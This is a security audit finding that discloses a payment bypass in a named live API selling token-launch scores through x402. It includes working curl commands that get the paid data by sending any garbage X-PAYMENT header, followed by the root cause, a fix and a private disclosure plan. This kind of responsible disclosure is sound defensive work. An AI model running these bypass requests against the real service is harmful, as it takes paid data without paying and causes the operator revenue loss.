# 🚨 CRITICAL: Payment Bypass — base-intel-api (header-presence check, no verification)

**Date:** 2026-06-05
**Auditor:** HFSP Labs
**Severity:** CRITICAL (confirmed, reproducible)
**Type:** auth-bypass / payment-not-verified
**Service:** `base-intel-api.jakemaxsigal.workers.dev` — "Base token launch score / memecoin risk API"
**Endpoint:** `GET https://base-intel-api.jakemaxsigal.workers.dev/bankr/score`
**Listed price:** 8000 (0.008 USDC) on Base

---

## Summary

The endpoint gates content on the **presence** of an `X-PAYMENT` header, not on a
**valid, settled payment**. Any non-empty `X-PAYMENT` value — including `x` or `12345` —
returns the full paid dataset. The service can be used indefinitely for free.

---

## Proof (reproducible)

```bash
# No header → correctly gated
curl -s -o /dev/null -w "%{http_code}\n" \
  https://base-intel-api.jakemaxsigal.workers.dev/bankr/score
# → 402

# Any garbage header → FULL PAID DATA
curl -s -H "X-PAYMENT: x" \
  https://base-intel-api.jakemaxsigal.workers.dev/bankr/score
# → 200 {"timestamp":"...","count":10,"launches":[{"tokenName":"CozeStudio",
#        "tokenSymbol":"COZES","tokenAddress":"0x845cc...",  ... ]}

curl -s -H "X-PAYMENT: 12345" \
  https://base-intel-api.jakemaxsigal.workers.dev/bankr/score
# → 200, same live launch data
```

Three distinct invalid values (`x`, `12345`, 88×`a`) all returned live data on
2026-06-05. No on-chain settlement occurs.

---

## Root Cause

Classic x402 implementation mistake: the handler does roughly
```
if (!req.headers['x-payment']) return 402;
return paidData();   // ← never verifies the payment payload / settlement
```
The signature is never decoded, the facilitator is never called, and no USDC transfer
is confirmed.

---

## Impact

- 100% revenue loss — the API is effectively free to anyone who sets any header value.
- Because the gate "looks" enforced (no header → 402), the operator may not notice.

---

## Recommended Fix

Verify the payment, don't just check the header exists:
1. Base64-decode `X-PAYMENT`, parse the payment payload.
2. Verify the signature and that `payTo` / `amount` / `asset` / `network` match the quote.
3. Settle (or verify settlement) via an x402 facilitator before serving content.
4. Reject anything that fails with `402` (not 200).

Reference: https://docs.cdp.coinbase.com/x402/welcome

---

## Disclosure

Operator handle from the worker subdomain: `jakemaxsigal`. File privately first
(payment bypass = direct revenue loss); give a fix window before any public note.
